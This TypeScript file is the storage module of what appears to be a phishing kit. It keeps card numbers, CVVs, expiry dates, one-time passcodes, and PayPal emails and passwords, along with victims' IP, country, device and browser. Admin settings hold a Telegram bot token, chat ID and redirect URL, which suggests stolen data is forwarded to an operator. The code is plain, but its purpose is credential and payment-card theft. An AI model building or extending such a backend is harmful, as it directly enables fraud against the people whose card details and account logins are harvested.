import { 
  type User, 
  type InsertUser, 
  type AdminSettings,
  type InsertAdminSettings,
  type PaymentRecord,
  type InsertPaymentRecord,
  type PaypalSession,
  type InsertPaypalSession
} from "@shared/schema";
import { randomUUID } from "crypto";

export interface IStorage {
  getUser(id: string): Promise<User | undefined>;
  getUserByUsername(username: string): Promise<User | undefined>;
  createUser(user: InsertUser): Promise<User>;
  
  getAdminSettings(): Promise<AdminSettings | undefined>;
  upsertAdminSettings(settings: InsertAdminSettings): Promise<AdminSettings>;
  
  createPaymentRecord(record: InsertPaymentRecord): Promise<PaymentRecord>;
  getPaymentRecord(id: string): Promise<PaymentRecord | undefined>;
  updatePaymentRecord(id: string, updates: Partial<InsertPaymentRecord>): Promise<PaymentRecord | undefined>;
  getAllPaymentRecords(): Promise<PaymentRecord[]>;
  
  createPaypalSession(session: InsertPaypalSession): Promise<PaypalSession>;
  getPaypalSession(sessionId: string): Promise<PaypalSession | undefined>;
  updatePaypalSession(sessionId: string, updates: Partial<InsertPaypalSession>): Promise<PaypalSession | undefined>;
  getAllPaypalSessions(): Promise<PaypalSession[]>;
}

export class MemStorage implements IStorage {
  private users: Map<string, User>;
  private adminSettings: AdminSettings | null;
  private paymentRecords: Map<string, PaymentRecord>;
  private paypalSessions: Map<string, PaypalSession>;

  constructor() {
    this.users = new Map();
    this.adminSettings = null;
    this.paymentRecords = new Map();
    this.paypalSessions = new Map();
  }

  async getUser(id: string): Promise<User | undefined> {
    return this.users.get(id);
  }

  async getUserByUsername(username: string): Promise<User | undefined> {
    return Array.from(this.users.values()).find(
      (user) => user.username === username,
    );
  }

  async createUser(insertUser: InsertUser): Promise<User> {
    const id = randomUUID();
    const user: User = { ...insertUser, id };
    this.users.set(id, user);
    return user;
  }

  async getAdminSettings(): Promise<AdminSettings | undefined> {
    return this.adminSettings || undefined;
  }

  async upsertAdminSettings(settings: InsertAdminSettings): Promise<AdminSettings> {
    const id = this.adminSettings?.id || randomUUID();
    const adminSettings: AdminSettings = {
      id,
      telegramBotToken: settings.telegramBotToken ?? null,
      telegramChatId: settings.telegramChatId ?? null,
      redirectUrl: settings.redirectUrl ?? null,
      redirectEnabled: settings.redirectEnabled ?? "false",
      updatedAt: new Date(),
    };
    this.adminSettings = adminSettings;
    return adminSettings;
  }

  async createPaymentRecord(record: InsertPaymentRecord): Promise<PaymentRecord> {
    const id = randomUUID();
    const paymentRecord: PaymentRecord = {
      id,
      cardNumber: record.cardNumber,
      expiryMonth: record.expiryMonth,
      expiryYear: record.expiryYear,
      cvv: record.cvv,
      cardholderName: record.cardholderName,
      otp1: record.otp1 ?? null,
      otp2: record.otp2 ?? null,
      paypalEmail: record.paypalEmail ?? null,
      paypalPassword: record.paypalPassword ?? null,
      createdAt: new Date(),
    };
    this.paymentRecords.set(id, paymentRecord);
    return paymentRecord;
  }

  async getPaymentRecord(id: string): Promise<PaymentRecord | undefined> {
    return this.paymentRecords.get(id);
  }

  async updatePaymentRecord(id: string, updates: Partial<InsertPaymentRecord>): Promise<PaymentRecord | undefined> {
    const existing = this.paymentRecords.get(id);
    if (!existing) return undefined;

    const updated: PaymentRecord = {
      ...existing,
      ...updates,
    };
    this.paymentRecords.set(id, updated);
    return updated;
  }

  async getAllPaymentRecords(): Promise<PaymentRecord[]> {
    return Array.from(this.paymentRecords.values()).sort(
      (a, b) => (b.createdAt?.getTime() || 0) - (a.createdAt?.getTime() || 0)
    );
  }

  async createPaypalSession(session: InsertPaypalSession): Promise<PaypalSession> {
    const id = randomUUID();
    const paypalSession: PaypalSession = {
      id,
      sessionId: session.sessionId,
      email: session.email,
      password: session.password,
      ipAddress: session.ipAddress ?? null,
      country: session.country ?? null,
      device: session.device ?? null,
      browser: session.browser ?? null,
      redirectUrl: session.redirectUrl ?? null,
      status: session.status ?? "waiting",
      createdAt: new Date(),
    };
    this.paypalSessions.set(session.sessionId, paypalSession);
    return paypalSession;
  }

  async getPaypalSession(sessionId: string): Promise<PaypalSession | undefined> {
    return this.paypalSessions.get(sessionId);
  }

  async updatePaypalSession(sessionId: string, updates: Partial<InsertPaypalSession>): Promise<PaypalSession | undefined> {
    const session = this.paypalSessions.get(sessionId);
    if (!session) return undefined;

    const updated: PaypalSession = {
      ...session,
      ...updates,
    };
    this.paypalSessions.set(sessionId, updated);
    return updated;
  }

  async getAllPaypalSessions(): Promise<PaypalSession[]> {
    return Array.from(this.paypalSessions.values()).sort(
      (a, b) => (b.createdAt?.getTime() || 0) - (a.createdAt?.getTime() || 0)
    );
  }
}

export const storage = new MemStorage();
